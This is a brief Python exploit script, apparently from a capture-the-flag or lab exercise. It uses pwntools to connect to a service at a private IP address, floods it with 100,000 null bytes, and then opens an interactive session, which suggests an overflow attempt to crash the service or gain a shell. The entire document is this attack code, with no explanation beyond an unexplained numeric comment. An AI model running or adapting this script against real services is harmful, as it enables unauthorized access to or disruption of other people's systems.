import pwn

s = pwn.remote('10.10.0.110', 4712)

n = ""
for i in range(100000):
    n +="\x00"

s.sendline(n)

# 36220
s.interactive()